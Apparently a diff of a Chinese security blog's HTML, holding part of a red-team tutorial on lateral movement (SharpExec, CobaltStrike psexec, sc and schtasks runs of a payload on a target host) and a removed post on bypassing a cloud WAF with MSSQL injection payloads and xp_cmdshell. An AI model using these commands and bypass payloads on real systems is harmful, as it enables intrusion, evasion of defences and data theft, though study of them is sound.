+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpExec.exe -m&#x3D;wmiexec -i&#x3D;192.168.3.144 -u&#x3D;Administrator -p&#x3D;xxx -d&#x3D;.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828094503678.png" alt="image-20200828094503678"></p>
+<p>​        通过put命令进行文件上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put C:\Users\jerry\Desktop\artifact.exe artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828094720655.png" alt="image-20200828094720655"></p>
+<p>​        也可以进行文件下载操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get artifact.exe C:\Users\jerry\Desktop\test666.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828095837635.png" alt="image-20200828095837635"></p>
+<p>​        最后输入exit即可退出shell，这里需要注意，如果我们在shell中运行了CS生成的马，在马没有退出的情况下，可能再使用wmiexec会出现异常，只要退出这个马就好了。</p>
+<p><strong>4、smbexec</strong></p>
+<p>​        使用smbexec和wmiexec功能上类型，获取的半交互shell是system权限。</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828100431041.png" alt="image-20200828100431041"></p>
+<p>​        也可以进行文件上传下载等操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put C:\Users\jerry\Desktop\artifact.exe c:\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828100629652.png" alt="image-20200828100629652"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get c:\artifact.exe C:\Users\jerry\Desktop\tes888.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828100822447.png" alt="image-20200828100822447"></p>
+<p>​        这款工具的功能先介绍这么多，他所集成的横向移动的方式并不多，但是对比impacet和crackmapexec，它主要再文件操作这部分进行了一些优化，<strong>可以很方便的去上传并且执行我们的shell</strong>。</p>
+<p>​        更详细的介绍请参考作者<a href="https://blog.redxorblue.com/2019/04/sharpexec-lateral-movement-with-your.html" target="_blank" rel="noopener">博客</a></p>
+<h3 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h3><p>​        CobaltStrike自身内置了部分横向移动的模块，下面我将带着大家一起学习CobaltStrike内置的横向移动模块的使用。</p>
+<p><strong>1、psexec</strong></p>
+<p>​        当我们获取目标边界机的管理员权限时，可以通过psexec的方法进行横向移动，具体配置如下：</p>
+<p>​        点击target-》对想要横向移动的目标右键选择psexec    </p>
+<p>​    <img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828110435271.png" alt="image-20200828110435271"></p>
+<p>​            配置好账号密码和session以及listener后选择launch</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828110805427.png" alt="image-20200828110805427"></p>
+<p>​        执行后我们可以看到，CobaltStrike生成了一个service类型的shell并且在目标主机执行</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828111216157.png" alt="image-20200828111216157"></p>
+<p>​        获取权限后，我们查看目标主机的进程，可以看到CobaltStrike是通过rundll32来执行的</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828111534458.png" alt="image-20200828111534458"></p>
+<p>​        因此如果在进程中有以system权限起的没有参数的rundll32进程，则有可能是通过CobaltStrike的psexec功能来进行横向移动。</p>
+<p><strong>2、psexec_psh</strong></p>
+<p>​            使用psexec_psh方式进行横向移动操作过程和psexec类似</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828113904782.png" alt="image-20200828113904782"></p>
+<p>​            获取权限后，我们查看目标主机的进程，可以看到CobaltStrike是通过powershell来执行的</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828114117604.png" alt="image-20200828114117604"></p>
+<p>​            根据<a href="https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f" target="_blank" rel="noopener">这篇博客</a>的介绍，CobaltStrike会创建一个powershell的脚本，该脚本将对内存中运行的嵌入式有效载荷进行base64编码，并将其压缩为单行格式，连接到ADMIN $或C $ share并运行PowerShell命令。</p>
+<p><strong>3、SC</strong></p>
+<p>​        使用这种方式进行横向移动，CobaltStrike并没有提供这种横向移动的方式，不过我们还是可以通过命令行的方式来进行横向移动。</p>
+<p>​        首先生成一个serivce类型的shell,将生成的文件上传的边界服务器。</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828115222147.png" alt="image-20200828115222147"></p>
+<p>​        再与目标主机建立ipc连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\192.168.3.144\C$ &quot;xxx&quot; &#x2F;user:&quot;Administrator&quot;</span><br><span class="line">shell net use</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828115358559.png" alt="image-20200828115358559"></p>
+<p>​        通过文件拷贝命令将生成的services.exe拷贝到目标主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy services.exe \\192.168.3.144\C$\windows\temp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828115522488.png" alt="image-20200828115522488"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell sc \\192.168.3.144 create xxxxx binpath&#x3D; &quot;c:\windows\temp\services.exe&quot;</span><br><span class="line">shell sc \\192.168.3.144 start xxxxx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828133951366.png" alt="image-20200828133951366"></p>
+<p><strong>4、Remote-exec</strong> </p>
+<p>​        在cobaltstrike中，使用remote-exec  module  target  command+args来尝试在远程目标主机上运行特定的程序。</p>
+<p>（1）psexec</p>
+<p>​        首先生成一个<strong>service类型</strong>的exe，上传到目标主机</p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828140744823.png" alt="image-20200828140744823"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote-exec psexec \\192.168.3.144 c:\windows\temp\services.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828141119157.png" alt="image-20200828141119157"></p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828141146963.png" alt="image-20200828141146963"></p>
+<p>（2）WMI</p>
+<p>​        使用CS生成一个exe上传到目标主机，通过remote-exec的wmi模块运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote-exec wmi 192.168.3.144 C:\windows\temp\artifact.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828141501441.png" alt="image-20200828141501441"></p>
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828141509268.png" alt="image-20200828141509268"></p>
+<p><strong>5、SCHTASKS</strong></p>
+<p>​        同样cobaltstrike中没有集成schtasks模块，不过我们仍然可以手工运行,首先生成一个shell,将shell上传到目标服务器，使用下面的命令创建计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> shell schtasks &#x2F;create &#x2F;s 192.168.3.144 &#x2F;u &quot;administrator&quot; &#x2F;p &quot;xxxx&quot; &#x2F;RL HIGHEST &#x2F;F &#x2F;tn &quot;windowstest666&quot; &#x2F;tr &quot;c:\windows\temp\artifact.exe&quot; &#x2F;sc DAILY &#x2F;mo 1 &#x2F;ST 00:00</span><br><span class="line">shell schtasks &#x2F;run &#x2F;tn windowstest666 &#x2F;s 192.168.3.144 &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxx&quot;</span><br><span class="line">shell schtasks &#x2F;F &#x2F;delete &#x2F;tn windowstest666 &#x2F;s 192.168.3.144  &#x2F;U &quot; administrator&quot; &#x2F;P &quot;xxxx&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/26/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%A5%97%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/image-20200828154502358.png" alt="image-20200828154502358"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过对这些横向渗透的工具的学习，我们可以发现Crackmapexec主要使用在做批量操作时使用，impacket有很多针对不同协议进行横向移动的套件，SharpExec适合对文件操作比较好，CobaltStrike虽然横向的方式不是很多，不过针对我们也可以配合一些命令去执行。</p>
+<p><strong>参考文章</strong></p>
+<p><a href>知识星球-红队攻防揭秘</a></p>
+<p><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">Crackmapexec</a></p>
+<p><a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/" target="_blank" rel="noopener">CrackMapExec - Ultimate Guide</a></p>
+<p><a href="https://blog.redxorblue.com/2019/04/sharpexec-lateral-movement-with-your.html" target="_blank" rel="noopener">SharpExec-您最喜欢的.NET Bling的横向运动</a></p>
+<p><a href="https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f" target="_blank" rel="noopener">进攻性横向移动</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/23/%E5%85%B3%E4%BA%8E%E5%AD%A4%E7%8B%AC%E7%9A%84%E7%90%86%E8%A7%A3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2134,164 +2455,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/" class="post-title-link" itemprop="url">记MSSQL绕过阿里云</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-07-26 11:17:07" itemprop="dateCreated datePublished" datetime="2020-07-26T11:17:07+08:00">2020-07-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-07-29 17:00:04" itemprop="dateModified" datetime="2020-07-29T17:00:04+08:00">2020-07-29</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最近一直在学习关于WAF绕过的知识，本次选择阿里云这款云WAF来测试关于MSSQL注入的绕过。因为阿里云主站可能不</span><br><span class="line">是ASP+IIS的环境，所以我不清楚如果真的是ASP+IIS的环境，阿里云的拦截规则是否会有相应的变化。</span><br></pre></td></tr></table></figure>
-
-<h2 id="绕过过程"><a href="#绕过过程" class="headerlink" title="绕过过程"></a>绕过过程</h2><h3 id="逻辑判断语句绕过"><a href="#逻辑判断语句绕过" class="headerlink" title="逻辑判断语句绕过"></a>逻辑判断语句绕过</h3><p>我们知道在检测一个注入点的时候，首先会加上and 1=1之类的判断语句，如果页面返回的逻辑符合我们设想的逻辑，那么就有可能有注入。</p>
-<p><strong>利用%特性绕过</strong></p>
-<p>在iis+asp的环境中，在关键字中间加%不会影响程序的正常执行，因此可以在关键字and中添加%来绕过阿里云的检测。</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726131616934.png" alt="image-20200726131616934"></p>
-<p><strong>利用unicode编码绕过</strong></p>
-<p>在ASP+IIS环境中，有某些特性的字符可能会有多个unicode编码，因此可以通过对关键字进行unicode编码进行绕过，比如字符A有多个unicode编码，使用%u0061，%u0041等可能无法绕过，但是使用%u00AA则可以绕过。</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726132202139.png" alt="image-20200726132202139"></p>
-<p><strong>参数污染</strong></p>
-<p>同样，我们也可以使用参数污染来绕过阿里云的检测，可能阿里云这种云WAF在设计上没有考虑到容器特性导致的绕过，只是适配于大多数网站的一般防护。</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726132416572.png" alt="image-20200726132416572"></p>
-<h3 id="绕过order-by拦截"><a href="#绕过order-by拦截" class="headerlink" title="绕过order by拦截"></a>绕过order by拦截</h3><p>阿里云对order by的拦截比较奇怪，如果order by后面跟的是个字符，则不会拦截，跟的是数字就会拦截，因此我们可以这样构造,order by “a”,1</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726133941676.png" alt="image-20200726133941676"></p>
-<p>上面是针对阿里云拦截的通用绕过方法，我们也可以结合asp的特性来进行绕过，比如%,参数污染等等</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726134347117.png" alt="image-20200726134347117"></p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726134426821.png" alt="image-20200726134426821"></p>
-<p>换行+注释，这里阿里云是这样的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--%0a 不拦截，这个是mssql的注释+换行</span><br><span class="line">--+%0a 拦截，mysql注释+换行</span><br></pre></td></tr></table></figure>
-
-<p>这就可以说明阿里云这款云WAF的主要拦截规则是为mysql设计的，至少在edu.aliyun.com这个站是这样的，至于其他的网站，我没有找到用阿里云的asp的站，所以没有测试。</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726134723900.png" alt="image-20200726134723900"></p>
-<h3 id="联合注入绕过"><a href="#联合注入绕过" class="headerlink" title="联合注入绕过"></a>联合注入绕过</h3><p>在ASP+IIS的环境中，%11等也可以代替空白字符，这个阿里云也没有考虑到，因此也可以达到绕过的目的。</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726135438964.png" alt="image-20200726135438964"></p>
-<p>至于union和select之后的其他字符，并不会被拦截</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726135841710.png" alt="image-20200726135841710"></p>
-<p>假如现在要通过union注入获取数据，比如version，数据库等等，我们看下怎么绕过。</p>
-<h4 id="获取版本信息"><a href="#获取版本信息" class="headerlink" title="获取版本信息"></a>获取版本信息</h4><p>比如获取version，直接使用version关键字是不拦的，只有使用@@version时才会拦截。而且单独的@@version也是会被阿里云拦截的</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726140854413.png" alt="image-20200726140854413"></p>
-<p>所以这里要绕过的话，就是要想办法破坏@@version这个关键字，方法也挺多的。</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726140950076.png" alt="image-20200726140950076"></p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141003116.png" alt="image-20200726141003116"></p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141022204.png" alt="image-20200726141022204"></p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141048780.png" alt="image-20200726141048780"></p>
-<h4 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h4><p>使用db_name()获取数据库，这个直接没有拦截，没什么好说的</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141206749.png" alt="image-20200726141206749"></p>
-<p>获取其他的数据库，源语句如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select null,null,null,name from master..sysdatabases where name not in(&#39;master&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>前面union select的绕过方法不变，这里我测试过程中发现当我使用master..sysdatabases会被阿里云拦截。</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141611877.png" alt="image-20200726141611877"></p>
-<p>但是master..sysdatabases单独出现并不会被拦截，因此绕过的思路有两种，第一种是破坏master..sysdatabases出现的上下文环境，另一种就是就是对这个关键字自身做一些操作。</p>
-<p><strong>方法一：参数污染</strong></p>
-<p>使用这种方式进行处理，就是破坏这个关键字出现的上下问环境</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726142000412.png" alt="image-20200726142000412"></p>
-<p><strong>方法二：破坏关键字本身</strong></p>
-<p>这里阿里云是将master..sysdatabases整体当作一个拦截规则进行拦截的，因此我们可以破坏这个关键字本身来达到绕过的目的。</p>
-<p>注释+换行，在.中间加上注释和换行不会影响程序的正常解析，但是却可以绕过阿里云</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726142708993.png" alt="image-20200726142708993"></p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726142729333.png" alt="image-20200726142729333"></p>
-<p>当然，我们也可以使用unicode编码</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726142856285.png" alt="image-20200726142856285"></p>
-<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><p>这个阿里云不拦截，因此没什么好说的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union--xxxx%0aselect null,null,null,name from 数据库名..sysobjects  where xtype&#x3D;&#39;U&#39;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726143029949.png" alt="image-20200726143029949"></p>
-<h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union--xxxx%0aselect null,null,null,name from%11sysobjects  where id&#x3D;(select id </span><br><span class="line">from sysobjects WHERE name &#x3D; &#39;表名&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>这里阿里云拦截了select id from这部分，但是单独的select id from是不会拦截的，所以我们要把这个语句放在上下问环境下来测试绕过。首先我发现select xxx也是会被拦截的，我在select中假如了%达到了此处的绕过。</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726144229258.png" alt="image-20200726144229258"></p>
-<p>后面的部分也就不会拦截了,所以绕过语句如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union--xxxx%0aselect null,null,null,name from%11sysobjects where id&#x3D;(sele%ct id from sysobjects where name&#x3D;&#39;x&#39;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726145119306.png" alt="image-20200726145119306"></p>
-<h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p>这个没啥说的，本身就可以直接绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union--xxxx%0aselect null,null,null,name from%11数据库..表名</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726145308997.png" alt="image-20200726145308997"></p>
-<h3 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h3><p>很多时候我们拿到MSSQL的注入，可能是直接执行命令而不是出数据，对吧？</p>
-<p>首先是不是要判断能不能执行多语句，我最常用的是waitfor delay ’00：00：05‘这样的语句来判断是否支持多语句，所以我们首先看下怎么使用这个语句绕过阿里云。</p>
-<p>这里讲一下，我在对WAF进行绕过测试的思路。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先，我要判断出这个WAF的拦截规则，比如waitfor delay ’00：00：05‘，这个直接会被阿里云拦的,所以我要</span><br><span class="line">判断是那部分被阿里云拦了。这里的绕过测试其实和免杀的方法类似，就是特征码定位，比如，我删除了delay后面的</span><br><span class="line">部分，还是会被拦，因此&#39;00:00:05&#39;并不是WAF拦截的部分，我再删除了delay发现不烂了，因此，可能拦截的就</span><br><span class="line">是waitfor delay这个关键字。</span><br></pre></td></tr></table></figure>
-
-<p><strong>绕过一：unicode编码</strong></p>
-<p>通过之前的测试，我们知道关键字a的unicode编码是没有被阿里云拦截的，因此我们可以通过unicode编码绕过。</p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150126019.png" alt="image-20200726150126019"></p>
-<p><strong>绕过二：空白字符</strong></p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150214566.png" alt="image-20200726150214566"></p>
-<p><strong>绕过三：注释+换行</strong></p>
-<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150252014.png" alt="image-20200726150252014"></p>
-<p>然后假如我们要调用xp_cmdshell执行命令，该怎么绕过。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;whoami&#39;</span><br></pre></td></tr></table></figure>
-
